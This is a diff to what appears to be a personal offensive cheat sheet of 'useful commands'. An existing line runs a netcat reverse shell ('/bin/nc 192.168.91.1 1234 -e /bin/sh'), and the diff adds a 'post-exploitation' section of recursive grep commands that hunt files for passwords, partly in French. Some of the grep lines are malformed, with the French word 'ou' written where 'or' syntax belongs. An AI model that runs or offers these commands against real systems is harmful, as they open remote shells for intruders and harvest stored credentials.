@@ -39,3 +39,10 @@ few scripts and useful commands
 <ul>
 <li>/bin/nc 192.168.91.1 1234 -e /bin/sh /bin</li>
 </ul>
+
+# post-exploitation
+<ul>
+<li> grep -air --include=*.txt ou .json ou .sh password ou mot de passe </li>
+<li> grep -air --include=*.txt mot de passe </li>
+<li> grep -air --include=*pass* ""</li>
+</ul>
